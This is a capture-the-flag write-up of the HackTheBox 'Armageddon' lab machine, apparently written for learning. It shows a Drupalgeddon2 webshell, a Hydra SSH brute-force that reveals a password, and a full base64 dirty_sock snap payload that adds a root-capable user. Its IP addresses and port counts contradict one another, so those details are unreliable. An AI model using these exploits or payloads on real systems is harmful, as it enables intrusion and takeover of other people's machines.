# Nmap scan report for 10.10.10.245 <br>

PORT   STATE SERVICE <br>
21/tcp open  ftp <br>
22/tcp open  ssh <br>
80/tcp open  http <br>

<h2>Foothold</h2>

There are only 2 open ports (22, 80)

**Default page on port 80**

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622112035.png)

The layout of the page is that of a Drupal page, along side with the name "armageddon", this leads me to believe that the exploit to be used will be Druppalgeddon. https://github.com/dreadlocked/Drupalgeddon2
</br>

Using the exploit above I was able to create a webshell

	./drupalgeddon2.rb 10.10.10.233

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622112703.png)
<!--![[Pasted image 20210622112703.png]] -->

Now that I have a shell on the system I can do some user enumeration, I'll start by looking at the user's on the system.

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622124047.png)
<!--![[Pasted image 20210622124047.png]] -->

I can see an interesting/potential user that I might be able to gain access to.

	brucetherealadmin:x:1000:1000::/home/brucetherealadmin:/bin/bash

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622123957.png)
<!--![[Pasted image 20210622123957.png]] -->

I've tried several techniques to login but couldn't so I will brute force his credentials.

	hydra -V -I -l brucetherealadmin -P '/usr/share/wordlists/rockyou.txt' 10.10.10.233 ssh -s 22

	[22][ssh] host: 10.10.10.233   login: brucetherealadmin   password: booboo

I can now ssh into user with the found credentials

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622124359.png)
<!--![[Pasted image 20210622124359.png]]-->
</br>

<h2>Privilege Escalation</h2>

Running the command sudo -l will reveal the current user's sudo permissions:

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622140307.png)
<!--![[Pasted image 20210622140307.png]] -->
</br>
After doing some research on '/usr/bin/snap install *', it seems that the dirty_socks exploit will be used
 https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py
 
 The exploit itself doesn't work, but there is a piece of code that we can manually look at as well as use on it's own:
 
 ![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622140554.png)
 <!--![[Pasted image 20210622140554.png]]-->
 
 In order to get this exploit to work I will use python to print out the 'TROJAN_SNAP' contents and decrypt it in base64 to create a .snap file, from there i will install the file using /usr/bin/snap install, the contents of TROJAN_SNAP will create a super user called dirty_sock, with a likewise password.
 
</b> Step 1: </b>
 
	python2 -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="' | base64 -d > privesc.snap
 
<b> Step 2: </b>

	sudo /usr/bin/snap install --devmode privesc.snap	

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622141040.png)
<!--![[Pasted image 20210622141040.png]]-->

I can confirm that this exploit worked by looking at the '/etc/passwd' file, looking at the bottom I can see that the user dirty_sock was added:

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622141124.png)
<!--![[Pasted image 20210622141124.png]]-->

Now I can 'sudo su' as root with the user dirty_sock:

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622140046.png)
<!--![[Pasted image 20210622140046.png]]-->


![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622140122.png)
<!--![[Pasted image 20210622140122.png]]-->
</br>
</br>

<h1>Pwned!</h1>

![alt text](https://github.com/stSLAYER/HackTheBox-WriteUps/blob/main/Armageddon/screenshots/Pasted%20image%2020210622140230.png)
<!--![[Pasted image 20210622140230.png]]-->
